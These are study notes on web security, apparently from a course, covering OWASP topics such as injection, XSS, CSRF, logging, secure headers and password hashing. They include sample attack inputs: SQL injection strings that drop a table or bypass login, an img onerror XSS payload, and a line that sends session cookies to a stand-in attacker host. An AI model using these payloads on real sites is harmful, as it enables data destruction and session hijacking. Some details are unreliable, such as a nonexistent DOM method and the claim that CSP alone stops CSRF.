The [Open Web Application Security Project (OWASP)](https://owasp.org/) releases every year the top 10 biggest issues on the web, when it comes to security. They have great resources on how to prevent these. It's a nice way to keep ourselves updated on the lastest security features.

# Injections
These are the most common attacks. Most of the time, if we're preventing against injections, we've covered a big chunk of improving security.

__Injections__ → injecting code into another piece of code. One of the most injections is **SQL Injections**. To prevent injections, there are three main things we can do:
- __Sanitize Input__ → the *white list philosophy*. Only allow user to input data of our expected type. If it's not the proper type, discard it. We can have a blacklist or a whitelist.
- __Parametrize Queries__ → also known as **prepared statements**. Pre-compiles a SQL statement, so the only thing we need to supply are the parameters. We can also use *Knex.js* or **Object-Relational Mapping (ORMs)**, such as *Sequelize*.

### SQL Injections
```sql
INSERT INTO users (email) VALUES(''; DROP TABLE users; --);
```
Instead of sending a string with an email, we send text with a query `'; DROP TABLE users; --`. Another popular SQL injection is `' or 1=1--` for when we're trying to login as a user, which will return all the user information.

### JavaScript Injections
It is also possible to inject scripts into the DOM, if we are setting the `innerHTML` of a node. Although if we directly insert a `script` tag the DOM will not run it, we can insert an `<img>` tag and give it an error event handler.
```html
<img src='/' onerror="alert('here')">
```

To prevent this, instead of using `innerHTML` we can use the `document.createTextNode`. It converts the user input into text.
```javascript
const userInputHTML = (input) => {
  const p = document.createElementById('paragraph')

  const textNode = document.createTextNode(input)
  p.appendChild(textNode)
}
```

# 3rd Party Libraries
We are using code that we didn't write ourselves. When we added it to our projects, we want to make sure that it's a good, trushworthy, and secure library - anyone can upload anything to npm, including malicious code, or code that tracks user behavior.

We can go to their GitHub page and check their *README* file, the stars, and how many times it has been forked. Generally, we can trust big libraries, like React and Redux.

## Checking for vulnerabilities
There are two main tools we can use to check our 3rd party libraries for vulnerabilities.

`npm audit` → it audits our *package.json* file. Introduced in npm v6.

`synk test` → it audits our *node_modules* directory. It will require a connection with our GitHub account. They have their own internal vulnerability database.

When we find a vulnerability we may want to update that package, although we need to be aware that there may be breaking changes. We can also contact the library maintainer to update the dependency versions.

# Logging
__Logging__ → getting information from our system, *e.g.* machine, or server, as to what is happening. We want to gather information on how users are using our server, so that if something goes wrong or there's any suspicious activity, we can more easily find the issue and prevent attacks.

Insufficient logging and monitoring, coupled with missing or ineffective logging allows attackers to attack system while undetected. Studies have shown in average it takes 200 days to detect a breach.

We need to make sure we don't save any personal user information in our logs, and that we are not returning any logging output to the client.

**Logs are only gonna tell us of a malicious event once it's already happened.**

## Logging with NodeJS
There are two good tools we can use: [*winston*](https://www.npmjs.com/package/winston) and [*morgan*](https://www.npmjs.com/package/morgan).

__morgan__ → HTTP request logger middleware. There are multiple format options, such as `tiny`, and `combined`.

__winston__ → simple and universal logging library. We can use it as a `console.log`, but it's also possible to save these logs somewhere else.

# HTTPS Everywhere
__HTTPS__ → SSL/TLS certificates. It creates a tunnel, encrypting the information being sent between the client and the server - third-parties won't be able to read it. HTTPS should be enabled for any website that has any kind of form, or deals with sensitive information.

There are ways we can miss configure or set up our server where we think we have HTTPS, while we actually have not.

The best way to get an HTTPS certificate is [Let's Encrypt](https://letsencrypt.org/). They provide certificates free of charge. We can also use [Cloudflare](https://www.cloudflare.com/) - they work as Content Delivery Networks (CDNs) - which by default has HTTPS. They also have protection agaist DDOS attacks.

# XSS + CSRF
## Cross-Site Scripting (XSS)
__Cross-Site Scripting (XSS)__ → occurs when an application includes untrusted data, *e.g.* user supplied data, in a webpage without proper validation or escaping, using JavaScript. This allows attackers to execute scripts in a victim's browser.

*e.g.* comments on a blog that are not escaped can be used to send scripts to all the users who visit that page (similar to JavaScript injections).

What a lot of attackers will do is set `window.location` to the value they want, sending the user to whatever page the attacker wants. They can also send the cookies of the current website, which often are used to save user session. This is called **session hijack**.
```javascript
window.location = 'haxxed.com?cookie='+document.cookie
```

To prevent this, always **sanitize user input**, and **never use** `eval()` or `document.write()`

## Cross-Site Request Forgery (CSRF)
__Cross-Site Request Forgery (CSRF)__ → often involves in the user clicking on a link with a request to a server. If the user is already signed-in to a service, *e.g.* bank account, the attacker can exploit this and send requests to our server. Since the user is sign-in, the server will trust this request. It **exploits the trust that a site has in a user's browser**.

To prevent such attack, the only thing we need to do is set the **Content Security Policy** headers. It will tell the browser what places can do we (the website) trust to run scripts. We can also prevent the user's cookies to be accessed so easily, by setting the `httpOnly` and `secure` cookie headers.
```javascript
app.get('/', (req, res) => {
  // Secure the cookie
  res.cookie('session', '1', { httpOnly: true, secure: true })
  // Set the Content Security Policy header
  res.set({
    'Content-Security-Policy': "script-src 'self' 'https://api.example.com'",
  })
  // Send the response
  res.send('Hello Word!')
})
```

# Code Secrets
**Environment variables** provide a way to inject variables into our code from the "outside world". They are often used to save API keys, and database credentials. Ideally, they should be kept as secret as possible, and never never include them in public repos.

Traditionally, they are saved on a *.env* file.

On a NodeJS server, we can use the [dotenv](https://www.npmjs.com/package/dotenv) package to load our variables into `process.env`.

### React
Internally, *create-react-app* gives us access to environment variables through `process.env`. By default, we have access to `process.env.NODE_ENV`, which indicates whether if we are on a production build or development one. This is useful, since we can run things like analytics only on production or development mode.

To create our own enviroment variables, we add them into an *.env* file, with the prefix `REACT_APP_`.

# Secure Headers
HTTP Headers may contain information and/or options that makes an attack to our server easier, *e.g.* which language/framework powers our service (`X-Powered-By` header). The easiest way to prevent this is using the [Helmet](https://www.npmjs.com/package/helmet) npm package.
```
$ npm i helmet
```

Helmet works as a middleware.
```javascript
const helmet = require('helmet')

app.use(helmet())
```
It will also set others header options, such as `X-XSS-Protection`, `X-Frame-Options`, and `Strict-Transport-Security`. We can also set our own headers.

# Access Control
__Access Control__ → having restrictions on what authenticated users are allowed to do or not. After an attacker has logged in, what does it have access to? They can exploit flaws to gain access to unauthorized functionality, data, etc.

With access control, the main idea is **principal of least privilege**. Always give the least amount of privilege possible - but enough that people can do their work. This can be applied to anything: cors, administrative privilege, database access, etc.

## Cross-Origin Resource Sharing (CORS)
__Cross-Origin Resourse Sharing (CORS)__ → allows restricted resources on a web page to be requested from another domain outside the one from which the first resource was served.

The npm [cors](https://www.npmjs.com/package/cors) package provides a way for us to exactly set who do we want to give access to these restricted resources.
```javascript
const cors = require('cors')
// ...

const whiteList = ['http://example.com', 'http://example2.com']
const corsOptions = {
  origin: (origin, callback) => {
    if(whiteList.includes(origin)) {
      callback(null, true)
    } else {
      callback(new Error('Not allowed by CORS'))
    }
  }
}
app.use(cors(corsOptions))
```

# Data Management
Data management encompasses multiple ideas:
1. always have backups, never have one point of failure.
2. limit sensitive data exposure, encrypt data at rest (databse) or transition (HTTPS). Most of the times, encrypting data all data is too costly. We need to adapt to our available resources.

## Encryption
We want to use encryption for any data identifying users and sensitive data (*e.g.* billing data). There are two modes for ecryption: hashing, *e.g.* passwords, and ecrypting, *e.g.* a few columns on the database.

### Password Storage
There are three good hashing utilies for hashing passwords: [bcrypt](https://www.npmjs.com/package/bcrypt), [scrypt](https://www.npmjs.com/package/scrypt), and [Aragon2](https://en.wikipedia.org/wiki/Argon2). These are tools that have been tested and have been around for a while.

Before inserting a new password in the database, we send the password through one of these hashing functions. In the database, we only save the hashed password.

### Encrypting the database
The [*pgcrypto*](https://www.postgresql.org/docs/8.3/pgcrypto.html) module allows us to encrypt a few columns on a PostgreSQL database. It can be used to encrypt things like billing information, and email.

# Don't Trust Anyone
Anywhere there's a connection to an outside system, *e.g.* user input, emails, cookies, etc., we need to assume some attacker will try to break-in. We need to always keep in mind: “How can we prevent bad actors from doing bad things?”.

# Authentication
We need to make sure the person on the other end are who they say they are. This is done through the best practices previously mentioned - hashing passwords, and then properly managing the user session.

# Sources
[The Complete Junior to Senior Web Developer Roadmap (2020)](https://www.udemy.com/course/the-complete-junior-to-senior-web-developer-roadmap/), by Andrei Neagoie
